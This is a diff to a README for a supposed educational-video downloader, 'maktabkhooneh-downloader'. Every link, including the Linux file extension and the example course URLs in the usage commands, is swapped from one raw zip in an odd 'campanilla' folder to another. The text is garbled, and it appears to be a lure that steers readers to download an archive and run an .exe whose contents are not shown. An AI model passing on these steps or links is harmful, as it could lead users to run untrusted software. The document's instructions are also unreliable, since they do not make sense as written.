@@ -1,6 +1,6 @@
 # 🎥 maktabkhooneh-downloader - Download Educational Videos Easily
 
-[![Download](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip)
+[![Download](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip)
 
 ## 📄 Overview
 
@@ -19,7 +19,7 @@ To run maktabkhooneh-downloader, ensure your system meets the following requirem
 
 1. **Visit the Releases Page**  
    Navigate to the releases page to find the latest version of maktabkhooneh-downloader. Click on the link below to access it directly:  
-   [Download from Releases](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip)
+   [Download from Releases](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip)
 
 2. **Choose Your Download**  
    On the releases page, you will see multiple files listed. Look for the version that suits your operating system. 
@@ -32,19 +32,19 @@ To run maktabkhooneh-downloader, ensure your system meets the following requirem
 To get started with your download:
 
 1. **Visit the Releases Page Again**  
-   Open this link: [Download from Releases](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip).
+   Open this link: [Download from Releases](https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip).
 
 2. **Select the Correct File**  
    Choose the file that matches your operating system:
 
    - For Windows users, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip` file.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip` file.
 
 3. **Run the Program**  
    - **Windows:** Double-click the downloaded `.exe` file to run it.
    - **macOS:** Open the `.dmg` file, drag the app to your Applications folder, then launch it.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip` file and run the binary from the terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip` file and run the binary from the terminal.
 
 ## 📚 Usage Instructions
 
@@ -69,12 +69,12 @@ After installing maktabkhooneh-downloader, you can start using it to download yo
 
    - To download a course video:
      ```
-     maktabkhooneh-downloader https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip
+     maktabkhooneh-downloader https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip
      ```
 
    - To include subtitles, add an option:
      ```
-     maktabkhooneh-downloader --subtitles https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh-downloader.zip
+     maktabkhooneh-downloader --subtitles https://raw.githubusercontent.com/marcelle94484/maktabkhooneh-downloader/main/campanilla/maktabkhooneh_downloader_2.5.zip
      ```
 
 4. **Access Your Files**  
